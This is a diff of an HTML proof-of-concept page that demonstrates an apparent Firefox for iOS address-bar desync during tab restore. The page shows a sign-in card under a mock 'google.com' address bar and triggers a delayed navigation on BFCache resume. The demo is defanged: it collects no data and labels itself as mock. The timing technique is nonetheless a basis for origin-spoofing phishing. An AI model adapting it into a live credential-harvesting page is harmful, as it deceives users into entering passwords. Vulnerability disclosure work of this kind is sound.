@@ -1,120 +1,197 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Origin Desync Login PoC</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Firefox iOS Tab Restore UI Desync — PoC (Mock Bar)</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+<meta name="theme-color" content="#ffffff">
 
 <style>
-body {
-  margin:0;
-  font-family:-apple-system,BlinkMacSystemFont,system-ui;
-  background:#f5f5f7;
+html, body {
+  margin: 0;
+  height: 100%;
+  overflow: hidden;
+  font-family: -apple-system, BlinkMacSystemFont, system-ui;
+  background: #f5f5f7;
 }
 
-button {
-  margin:40px;
-  font-size:18px;
-  padding:10px 18px;
+button, input {
+  -webkit-appearance: none;
+  appearance: none;
+}
+
+#start {
+  margin: 40px auto;
+  display: block;
+  font-size: 18px;
+  padding: 12px 20px;
+  border-radius: 12px;
 }
 
 #panel {
-  display:none;
-  max-width:420px;
-  margin:80px auto;
-  background:#fff;
-  padding:24px;
-  border-radius:16px;
-  box-shadow:0 20px 60px rgba(0,0,0,.2);
+  display: none;
+  position: fixed;
+  inset: 0;
+  z-index: 999999;
+  background: #f5f5f7;
+  padding:
+    env(safe-area-inset-top)
+    20px
+    env(safe-area-inset-bottom);
 }
 
-h2 { text-align:center; margin-bottom:6px; }
-.sub { text-align:center; color:#666; margin-bottom:20px; }
+/* --- Mock Address Bar (IN-PAGE, DEMO ONLY) --- */
+#mock-bar {
+  max-width: 420px;
+  margin: 20px auto 0;
+  padding: 10px 14px;
+  background: #ffffff;
+  border-radius: 10px;
+  box-shadow: 0 4px 12px rgba(0,0,0,.12);
+  font-size: 14px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+#mock-bar .lock { color: #2e7d32; }
+#mock-bar .url {
+  flex: 1;
+  color: #000;
+  font-weight: 500;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+#mock-bar .demo {
+  font-size: 11px;
+  color: #b00020;
+  font-weight: 700;
+}
+
+/* --- Login Card --- */
+.card {
+  max-width: 420px;
+  margin: 16px auto 0;
+  background: #ffffff;
+  padding: 24px;
+  border-radius: 16px;
+  box-shadow: 0 20px 60px rgba(0,0,0,.2);
+}
+
+h2 { text-align: center; margin-bottom: 6px; }
+.sub { text-align: center; color: #666; margin-bottom: 20px; }
 
 label {
-  display:block;
-  font-size:14px;
-  margin-top:12px;
+  display: block;
+  font-size: 14px;
+  margin-top: 12px;
 }
 
 input {
-  width:100%;
-  padding:10px;
-  font-size:16px;
-  border-radius:8px;
-  border:1px solid #ccc;
-  margin-top:6px;
-}
-
-.notice {
-  margin-top:14px;
-  font-size:13px;
-  color:#b00020;
+  width: 100%;
+  padding: 10px;
+  font-size: 16px;
+  border-radius: 8px;
+  border: 1px solid #ccc;
+  margin-top: 6px;
 }
 
 .login {
-  margin-top:20px;
-  width:100%;
-  padding:12px;
-  font-size:16px;
-  border-radius:10px;
-  border:none;
-  background:#007aff;
-  color:#fff;
+  margin-top: 20px;
+  width: 100%;
+  padding: 12px;
+  font-size: 16px;
+  font-weight: 600;
+  border-radius: 10px;
+  border: none;
+  background: #007aff;
+  color: #fff;
+}
+
+.notice {
+  margin-top: 14px;
+  font-size: 13px;
+  color: #b00020;
+  text-align: center;
 }
 </style>
 </head>
 
 <body>
 
-<div style="text-align:center">
-  <button id="trigger">Start PoC</button>
-</div>
+<button id="start">Start PoC</button>
 
 <div id="panel">
-  <h2>Account Sign‑In</h2>
-  <div class="sub">Session verification required</div>
+  <!-- Mock address bar (visualization only) -->
+  <div id="mock-bar">
+    <span class="lock">🔒</span>
+    <span class="url">https://google.com</span>
+    <span class="demo">MOCK UI</span>
+  </div>
 
-  <label>Email</label>
-  <input type="email" placeholder="user@example.com">
+  <div class="card">
+    <h2>Account Sign‑In</h2>
+    <div class="sub">Session verification required to continue</div>
 
-  <label>Password</label>
-  <input type="password" placeholder="••••••••">
+    <label>Email</label>
+    <input id="email" type="email" placeholder="user@example.com">
 
-  <button class="login" onclick="demoOnly()">Sign in</button>
+    <label>Password</label>
+    <input type="password" placeholder="••••••••">
 
-  <div class="notice">
-    Demo only — inputs are editable, no data is collected.
+    <button class="login" onclick="demoOnly()">Sign in</button>
+
+    <div class="notice">
+      Demo only — no data is collected.<br>
+      In‑page mock UI used to demonstrate browser UI state desynchronization during tab restore.
+    </div>
   </div>
 </div>
 
 <script>
 const panel = document.getElementById('panel');
-const trigger = document.getElementById('trigger');
+const start = document.getElementById('start');
+
+/*
+  Demonstrates a UI state desynchronization where web content
+  becomes interactive before the browser address bar completes
+  its navigation update during tab restore (BFCache).
+  The address bar shown is an IN-PAGE MOCK for ethical reasons.
+*/
 
 function demoOnly() {
   alert(
     'THIS IS NOT REAL\n\n' +
-    'NOT GOOGLE.\n' +
-    'No data is collected or transmitted.'
+    'No data is collected or transmitted.\n' +
+    'This is a UI desync demonstration.'
   );
-
-  // Reset input values immediately
-  document.querySelectorAll('#panel input').forEach(input => input.value = '');
+  document.querySelectorAll('#panel input').forEach(i => i.value = '');
 }
 
-trigger.onclick = () => {
+start.onclick = () => {
   history.pushState({}, '', '/trusted');
   panel.style.display = 'block';
+  document.body.style.overflow = 'hidden';
+
+  // Prove interactivity before navigation settles
+  setTimeout(() => {
+    document.getElementById('email').focus();
+  }, 50);
 };
 
-// Trigger navigation AFTER tab restore (mimics desync)
-window.addEventListener('pageshow', () => {
+// Trigger ONLY on tab restore / BFCache resume
+window.addEventListener('pageshow', (e) => {
+  if (!e.persisted) return;
+
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
-        location.href = 'http://GOOGLE.com:9000';
-      }, 80);
+        // Navigation that updates address bar after interactivity
+        location.href = 'https://google.com';
+      }, 100);
     });
   });
 });
